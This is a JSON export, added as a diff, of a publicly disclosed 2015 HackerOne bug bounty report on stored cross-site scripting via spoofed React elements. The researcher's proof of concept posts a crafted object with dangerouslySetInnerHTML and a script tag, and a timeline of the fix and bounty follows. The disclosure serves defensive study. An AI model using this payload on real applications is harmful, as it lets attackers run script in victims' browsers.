@@ -1,0 +1,538 @@
+{
+    "abilities": {
+        "can_manage_common_responses?": false, 
+        "can_manage_collaborators?": false, 
+        "can_reopen?": false, 
+        "can_ban_researcher?": false, 
+        "can_create_severity?": false, 
+        "can_assign_to_h1_triage?": false, 
+        "can_agree_on_going_public?": false, 
+        "assignable_team_member_groups": [], 
+        "can_view_credential_account_details?": false, 
+        "can_export?": false, 
+        "can_create_retest?": false, 
+        "can_assign_to_user?": false, 
+        "can_use_common_responses?": false, 
+        "can_hide_timeline?": false, 
+        "can_be_manually_disclosed?": false, 
+        "assignable_team_members": [], 
+        "can_clone?": false, 
+        "can_be_publicly_disclosed?": false, 
+        "can_close_comments?": false, 
+        "can_view_bounty_weights?": false, 
+        "can_suggest_bounty_amount?": false, 
+        "can_cancel_disclosure_request?": false, 
+        "can_redact?": false, 
+        "can_change_structured_scope?": false, 
+        "can_post_internal_comments?": false, 
+        "can_change_state?": false, 
+        "can_change_weakness?": false, 
+        "can_add_comment?": false, 
+        "can_reassign_to_team?": false, 
+        "can_change_title?": false, 
+        "can_award_bounty?": false, 
+        "can_award_swag?": false, 
+        "can_close?": false, 
+        "can_manage?": false
+    }, 
+    "comments_closed?": false, 
+    "substate": "resolved", 
+    "bug_reporter_agreed_on_going_public_at": "2015-03-18T13:11:48.827Z", 
+    "voters": [
+        "irvinlim", 
+        "spam404", 
+        "dreadpiraterobertt", 
+        "xsam", 
+        "gamliel", 
+        "axolotl", 
+        "mygf", 
+        "japz", 
+        "rashedhasan007", 
+        "amjamjamj", 
+        "and 2 more..."
+    ], 
+    "facebook_team?": false, 
+    "has_bounty?": true, 
+    "bounty_amount": "5000.0", 
+    "rejected_anc_report_that_can_be_sent_back_to_anc_triagers?": false, 
+    "original_report_id": null, 
+    "id": 49652, 
+    "can_view_team": true, 
+    "team_member_agreed_on_going_public_at": "2015-03-18T07:38:32.505Z", 
+    "vulnerability_information": "**Note:** I haven't yet investigated the implications of this fully, so this may be more severe than I'm currently aware of.  Right now the only exploits I'm aware of allow a team member to attack other team members.\r\n\r\nI've found a couple fields that I'd expect to be limited to string values, but which **actually accept data of arbitrary types**.  So far, I've found that these include:\r\n\r\n- The `reference` field on a report triage action\r\n- The `data` field of a trigger criterion\r\n\r\n(There are several other fields that seem to accept an arbitrary type, but appear to be converted into strings.  The above fields also come back from the server as non-strings.)\r\n\r\nBy manually crafting the JSON used when setting these fields, a malicious person can set them to non-string values, e.g. arrays or simple objects.  \r\n\r\nWhen these fields are rendered, they are assumed to be strings, and passed as the `children` argument when calling `React.createElement`.  Unfortunately, that argument is allowed to be text content **or a React child object**.  Since these fields can in fact be arbitrary objects, we can create an object that appears to be a React element, and which renders as something dangerous.\r\n\r\n**Proof of Concept**\r\n\r\nHere's how the exploit would work, using the `reference` field on a report:\r\n\r\nAs an attacker, open up a report and \"triage\" it, setting the reference field to an object that appears to be a React element.  This can be done from the console using the following command:  \r\n```\r\n$.ajax({ \r\n  url: \"https://hackerone.com/reports/bulk\", \r\n  method: 'post', \r\n  contentType: \"application/json\", \r\n  data: JSON.stringify({ \r\n    state: \"open\", \r\n    substate: \"triaged\", \r\n    report_ids: [\u2026 id of the report \u2026], \r\n    reply_action: \"change-state\", \r\n    reference: {\r\n      _isReactElement: true,\r\n      _store: {},\r\n      type:\"body\",\r\n      props: {\r\n        dangerouslySetInnerHTML: {\r\n          __html:\r\n            \"<h1>Arbitrary HTML</h1><script>alert('No CSP Support :(')</script>\"\r\n        }\r\n      }\r\n    }   \r\n  }) \r\n})\r\n```  \r\n\r\nNow, as a victim, open the report and observe that arbitrary HTML has been inserted.\r\n\r\nFor the curious, here's what the fields in the fake React element do:\r\n\r\n- `_isReactElement` tricks React into thinking it's rendering an element\r\n- `_store` prevents a javascript error (React tries writing some properties of this field)\r\n- `type` is the type of element to be rendered\r\n- `props` is the properties of the spoofed element.  `dangerouslySetInnerHTML` is a [special field](http://facebook.github.io/react/docs/special-non-dom-attributes.html) that lets you manually set the inner HTML for the element.", 
+    "activity_page_count": 1, 
+    "severity": {
+        "rating": "high", 
+        "author_type": "Team"
+    }, 
+    "title": "Improperly validated fields allows injection of arbitrary HTML via spoofed React objects", 
+    "is_member_of_team?": null, 
+    "vote_count": 12, 
+    "summaries": [
+        {
+            "category": "team", 
+            "can_create?": false, 
+            "can_view?": true
+        }, 
+        {
+            "category": "researcher", 
+            "can_create?": false, 
+            "can_view?": true
+        }
+    ], 
+    "structured_scope": null, 
+    "allow_singular_disclosure_at": "2015-04-17T07:38:33.833Z", 
+    "state": "Closed", 
+    "cve_ids": [], 
+    "activity_page_number": 1, 
+    "readable_substate": "Resolved", 
+    "public": true, 
+    "formatted_bounty": "$5,000", 
+    "singular_disclosure_disabled": false, 
+    "activities": [
+        {
+            "automated_response": false, 
+            "created_at": "2015-02-28T20:05:06.183Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-02-28T20:05:06.183Z", 
+            "actor": {
+                "username": "jobert", 
+                "url": "/jobert", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/002/35cc46a21b3756f9df61d6269d287b9dc53d5b27_medium.png?1410255083"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "Thanks again @danlec, we're looking into this.", 
+            "markdown_message": "<p>Thanks again <a href=\"/danlec\">@danlec</a>, we&#39;re looking into this.</p>\n", 
+            "type": "Activities::BugTriaged", 
+            "id": 343418, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2015-02-28T22:01:12.556Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-02-28T22:01:21.387Z", 
+            "actor": {
+                "username": "jobert", 
+                "url": "/jobert", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/002/35cc46a21b3756f9df61d6269d287b9dc53d5b27_medium.png?1410255083"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "We just pushed a temporary fix that mitigate the XSS vulnerabilities. We're still investigating the issue and will get back to you next week. Thanks again!", 
+            "markdown_message": "<p>We just pushed a temporary fix that mitigate the XSS vulnerabilities. We&#39;re still investigating the issue and will get back to you next week. Thanks again!</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 343461, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2015-02-28T22:23:22.014Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-02-28T22:23:22.014Z", 
+            "actor": {
+                "username": "danlec", 
+                "url": "/danlec", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/404/dd4debdb9212f2c377a195358843c4e28bdece8e_medium.png?1423267075"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "Wow, quick work!  (Didn't mean to interrupt anyone's weekend, just wanted to make the report as soon as I'd confirmed the issue.)", 
+            "markdown_message": "<p>Wow, quick work!  (Didn&#39;t mean to interrupt anyone&#39;s weekend, just wanted to make the report as soon as I&#39;d confirmed the issue.)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 343465, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2015-03-03T04:14:42.444Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-03-03T04:14:42.444Z", 
+            "actor": {
+                "username": "danlec", 
+                "url": "/danlec", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/404/dd4debdb9212f2c377a195358843c4e28bdece8e_medium.png?1423267075"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "It also looks like that the `inverse` field of a trigger criterion will accept (and return) an arbitrary JSON object, instead of just boolean values.  Given how that field is used though, it doesn't appear to have any security implications.", 
+            "markdown_message": "<p>It also looks like that the <code>inverse</code> field of a trigger criterion will accept (and return) an arbitrary JSON object, instead of just boolean values.  Given how that field is used though, it doesn&#39;t appear to have any security implications.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 344911, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2015-03-05T18:38:03.169Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-03-05T18:38:03.169Z", 
+            "actor": {
+                "username": "danlec", 
+                "url": "/danlec", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/404/dd4debdb9212f2c377a195358843c4e28bdece8e_medium.png?1423267075"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "Any updates?  I'm kinda curious if this affected more fields than the ones that I found\u2026", 
+            "markdown_message": "<p>Any updates?  I&#39;m kinda curious if this affected more fields than the ones that I found\u2026</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 346904, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2015-03-05T22:16:50.237Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-03-05T22:16:50.237Z", 
+            "actor": {
+                "username": "andrewone", 
+                "url": "/andrewone", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/015/236/14209407e303acb7aa505e80cb37f4b45da80100_medium.png?1418422182"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "Hi @danlec, we have a few things to take care of first this week, so the plan was to mitigate the vulnerabilities quickly and then work on a deeper investigation/fix the next. We should have an update for you next week.", 
+            "markdown_message": "<p>Hi <a href=\"/danlec\">@danlec</a>, we have a few things to take care of first this week, so the plan was to mitigate the vulnerabilities quickly and then work on a deeper investigation/fix the next. We should have an update for you next week.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 347147, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2015-03-13T20:52:15.682Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-03-13T20:52:15.682Z", 
+            "actor": {
+                "username": "danlec", 
+                "url": "/danlec", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/404/dd4debdb9212f2c377a195358843c4e28bdece8e_medium.png?1423267075"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "So \u2026 did you get a chance to investigate this one further?  `inverse` is still accepting arbitrary data, so I'm guessing this is still in progress.", 
+            "markdown_message": "<p>So \u2026 did you get a chance to investigate this one further?  <code>inverse</code> is still accepting arbitrary data, so I&#39;m guessing this is still in progress.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 354146, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2015-03-14T05:35:07.111Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-03-14T05:35:07.111Z", 
+            "actor": {
+                "username": "reed", 
+                "url": "/reed", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/003/132/5781ea1c43c5c7680dd145226b86348a8d6ed085_medium.jpg?1394062279"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "@danlec, we thought we've mitigated all the issues, but seems not, as you just pointed out. We'll continue investigating, and should hopefully have an update for you early next week.", 
+            "markdown_message": "<p><a href=\"/danlec\">@danlec</a>, we thought we&#39;ve mitigated all the issues, but seems not, as you just pointed out. We&#39;ll continue investigating, and should hopefully have an update for you early next week.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 354432, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2015-03-16T23:50:41.297Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-03-16T23:50:41.297Z", 
+            "actor": {
+                "username": "bencode", 
+                "url": "/bencode", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/117/d813c9668b163216f808ea44fe97d138069498fb_medium.jpg?1536189740"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "Hey @danlec, thanks for your patience! We investigated the `inverse` field and have deployed a fix to our production site. Can you verify this is resolved?", 
+            "markdown_message": "<p>Hey <a href=\"/danlec\">@danlec</a>, thanks for your patience! We investigated the <code>inverse</code> field and have deployed a fix to our production site. Can you verify this is resolved?</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 356335, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2015-03-17T03:30:00.990Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-03-17T03:30:00.990Z", 
+            "actor": {
+                "username": "danlec", 
+                "url": "/danlec", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/404/dd4debdb9212f2c377a195358843c4e28bdece8e_medium.png?1423267075"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "@bencode No worries!  I took a look, and it appears that the `inverse` field is now limited to boolean values \u2026 so it appears that the issue has been resolved.", 
+            "markdown_message": "<p><a href=\"/bencode\">@bencode</a> No worries!  I took a look, and it appears that the <code>inverse</code> field is now limited to boolean values \u2026 so it appears that the issue has been resolved.</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 356422, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "reporter": {
+                "username": "danlec", 
+                "url": "/danlec"
+            }, 
+            "created_at": "2015-03-17T22:22:48.282Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-03-17T22:22:48.282Z", 
+            "actor": {
+                "username": "ebrynne", 
+                "url": "/ebrynne", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/017/191/caa360ba5182e4fd7930e394d9fa654d468e6a20_medium.?1461015075"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "Thanks for helping us resolve this! We'll update with the bounty decision as soon as have it!", 
+            "markdown_message": "<p>Thanks for helping us resolve this! We&#39;ll update with the bounty decision as soon as have it!</p>\n", 
+            "type": "Activities::BugResolved", 
+            "id": 357185, 
+            "genius_execution_id": null
+        }, 
+        {
+            "bounty_currency": "usd", 
+            "automated_response": false, 
+            "created_at": "2015-03-17T22:24:58.193Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-03-17T22:24:58.193Z", 
+            "actor": {
+                "url": "/security", 
+                "profile": {
+                    "name": "HackerOne"
+                }, 
+                "ibb": false, 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/013/28af2ada2cc00aa9427504fc5a14f587362df84b_medium.png?1445331713"
+                }
+            }, 
+            "team_handle": "security", 
+            "bounty_amount": "5000.0", 
+            "collaborator": {
+                "username": "danlec", 
+                "url": "/danlec"
+            }, 
+            "message": "Congratulations! ", 
+            "markdown_message": "<p>Congratulations! </p>\n", 
+            "type": "Activities::BountyAwarded", 
+            "id": 357189, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2015-03-17T22:27:18.667Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-03-17T22:27:18.667Z", 
+            "actor": {
+                "username": "danlec", 
+                "url": "/danlec", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/404/dd4debdb9212f2c377a195358843c4e28bdece8e_medium.png?1423267075"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "Wow, thanks!  Happy to help :)", 
+            "markdown_message": "<p>Wow, thanks!  Happy to help :)</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 357192, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2015-03-18T00:17:00.601Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-03-18T00:17:00.601Z", 
+            "actor": {
+                "username": "danlec", 
+                "url": "/danlec", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/404/dd4debdb9212f2c377a195358843c4e28bdece8e_medium.png?1423267075"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "I've got a blog post ready for when you request public disclosure\u2026", 
+            "markdown_message": "<p>I&#39;ve got a blog post ready for when you request public disclosure\u2026</p>\n", 
+            "type": "Activities::Comment", 
+            "id": 357260, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2015-03-18T07:38:32.724Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-03-18T07:38:32.724Z", 
+            "actor": {
+                "username": "jobert", 
+                "url": "/jobert", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/002/35cc46a21b3756f9df61d6269d287b9dc53d5b27_medium.png?1410255083"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "first_to_agree": true, 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 357376, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2015-03-18T13:11:49.302Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-03-18T13:11:49.302Z", 
+            "actor": {
+                "username": "danlec", 
+                "url": "/danlec", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/404/dd4debdb9212f2c377a195358843c4e28bdece8e_medium.png?1423267075"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "A description of how I found this issue is at <http://danlec.com/blog/xss-via-a-spoofed-react-element>", 
+            "markdown_message": "<p>A description of how I found this issue is at <a title=\"http://danlec.com/blog/xss-via-a-spoofed-react-element\" href=\"/redirect?signature=d5c0f162a694bc9f604abebe7d2a064e18c026e4&amp;url=http%3A%2F%2Fdanlec.com%2Fblog%2Fxss-via-a-spoofed-react-element\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>http://danlec.com/blog/xss-via-a-spoofed-react-element</span><i class=\"icon-external-link\"></i></a></p>\n", 
+            "type": "Activities::AgreedOnGoingPublic", 
+            "id": 357547, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2015-03-18T13:11:50.560Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2015-03-18T13:11:50.560Z", 
+            "actor": {
+                "username": "danlec", 
+                "url": "/danlec", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/013/404/dd4debdb9212f2c377a195358843c4e28bdece8e_medium.png?1423267075"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "team_handle": "security", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportBecamePublic", 
+            "id": 357548, 
+            "genius_execution_id": null
+        }, 
+        {
+            "automated_response": false, 
+            "created_at": "2016-10-14T18:16:12.178Z", 
+            "is_internal": false, 
+            "editable": false, 
+            "updated_at": "2016-10-14T18:16:12.178Z", 
+            "actor": {
+                "username": "arice", 
+                "url": "/arice", 
+                "profile_picture_urls": {
+                    "medium": "https://profile-photos.hackerone-user-content.com/000/000/020/74e2a8a31fee27a0c9b3d1d90dd64f4e38b2fb1c_medium.jpeg?1466604112"
+                }, 
+                "hackerone_triager": false
+            }, 
+            "additional_data": {
+                "new_severity": "High", 
+                "old_severity": null
+            }, 
+            "team_handle": "security", 
+            "message": "", 
+            "markdown_message": "", 
+            "type": "Activities::ReportSeverityUpdated", 
+            "id": 1248052, 
+            "genius_execution_id": null
+        }
+    ], 
+    "in_validation?": false, 
+    "is_participant": false, 
+    "singular_disclosure_allowed": true, 
+    "reporter": {
+        "username": "danlec", 
+        "hacker_mediation": false, 
+        "hackerone_triager": false, 
+        "disabled": false, 
+        "url": "/danlec", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/013/404/7bc70afdc3a90691eb566c3f3db39e4556a2d185_small.png?1423267075"
+        }, 
+        "is_me?": false
+    }, 
+    "weakness": {
+        "id": 60, 
+        "name": "Cross-site Scripting (XSS) - Generic"
+    }, 
+    "is_external_bug": false, 
+    "visibility": "full", 
+    "allow_singular_disclosure_after": -114880989.44658928, 
+    "disclosed_at": "2015-03-18T13:11:50.503Z", 
+    "stage": 4, 
+    "url": "https://hackerone.com/reports/49652", 
+    "created_at": "2015-02-28T17:38:13.663Z", 
+    "original_report_url": null, 
+    "vulnerability_information_html": "<p><strong>Note:</strong> I haven&#39;t yet investigated the implications of this fully, so this may be more severe than I&#39;m currently aware of.  Right now the only exploits I&#39;m aware of allow a team member to attack other team members.</p>\n\n<p>I&#39;ve found a couple fields that I&#39;d expect to be limited to string values, but which <strong>actually accept data of arbitrary types</strong>.  So far, I&#39;ve found that these include:</p>\n\n<ul>\n<li>The <code>reference</code> field on a report triage action</li>\n<li>The <code>data</code> field of a trigger criterion</li>\n</ul>\n\n<p>(There are several other fields that seem to accept an arbitrary type, but appear to be converted into strings.  The above fields also come back from the server as non-strings.)</p>\n\n<p>By manually crafting the JSON used when setting these fields, a malicious person can set them to non-string values, e.g. arrays or simple objects.  </p>\n\n<p>When these fields are rendered, they are assumed to be strings, and passed as the <code>children</code> argument when calling <code>React.createElement</code>.  Unfortunately, that argument is allowed to be text content <strong>or a React child object</strong>.  Since these fields can in fact be arbitrary objects, we can create an object that appears to be a React element, and which renders as something dangerous.</p>\n\n<p><strong>Proof of Concept</strong></p>\n\n<p>Here&#39;s how the exploit would work, using the <code>reference</code> field on a report:</p>\n\n<p>As an attacker, open up a report and &quot;triage&quot; it, setting the reference field to an object that appears to be a React element.  This can be done from the console using the following command:  </p>\n<pre class=\"highlight plaintext\"><code>$.ajax({ \n  url: &quot;https://hackerone.com/reports/bulk&quot;, \n  method: &#39;post&#39;, \n  contentType: &quot;application/json&quot;, \n  data: JSON.stringify({ \n    state: &quot;open&quot;, \n    substate: &quot;triaged&quot;, \n    report_ids: [\u2026 id of the report \u2026], \n    reply_action: &quot;change-state&quot;, \n    reference: {\n      _isReactElement: true,\n      _store: {},\n      type:&quot;body&quot;,\n      props: {\n        dangerouslySetInnerHTML: {\n          __html:\n            &quot;&lt;h1&gt;Arbitrary HTML&lt;/h1&gt;&lt;script&gt;alert(&#39;No CSP Support :(&#39;)&lt;/script&gt;&quot;\n        }\n      }\n    }   \n  }) \n})\n</code></pre>\n<p>Now, as a victim, open the report and observe that arbitrary HTML has been inserted.</p>\n\n<p>For the curious, here&#39;s what the fields in the fake React element do:</p>\n\n<ul>\n<li>\n<code>_isReactElement</code> tricks React into thinking it&#39;s rendering an element</li>\n<li>\n<code>_store</code> prevents a javascript error (React tries writing some properties of this field)</li>\n<li>\n<code>type</code> is the type of element to be rendered</li>\n<li>\n<code>props</code> is the properties of the spoofed element.  <code>dangerouslySetInnerHTML</code> is a <a href=\"/redirect?signature=dfd71f58af62f906522f20f9aec9c03a277edcb8&amp;url=http%3A%2F%2Ffacebook.github.io%2Freact%2Fdocs%2Fspecial-non-dom-attributes.html\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"><span>special field</span><i class=\"icon-external-link\"></i></a> that lets you manually set the inner HTML for the element.</li>\n</ul>\n", 
+    "severity_rating": "high", 
+    "team_private?": false, 
+    "team": {
+        "profile": {
+            "website": "https://hackerone.com", 
+            "about": "Vulnerability disclosure should be safe, transparent, and rewarding.", 
+            "twitter_handle": "Hacker0x01", 
+            "name": "HackerOne"
+        }, 
+        "handle": "security", 
+        "url": "https://hackerone.com/security", 
+        "state": "public_mode", 
+        "profile_picture_urls": {
+            "small": "https://profile-photos.hackerone-user-content.com/000/000/013/68fea1fe00dc833f4109e015738af4b374727e56_small.png?1445331713", 
+            "medium": "https://profile-photos.hackerone-user-content.com/000/000/013/28af2ada2cc00aa9427504fc5a14f587362df84b_medium.png?1445331713"
+        }, 
+        "awards_miles": false, 
+        "permissions": [], 
+        "id": 13, 
+        "default_currency": "usd"
+    }, 
+    "is_published": false
+}
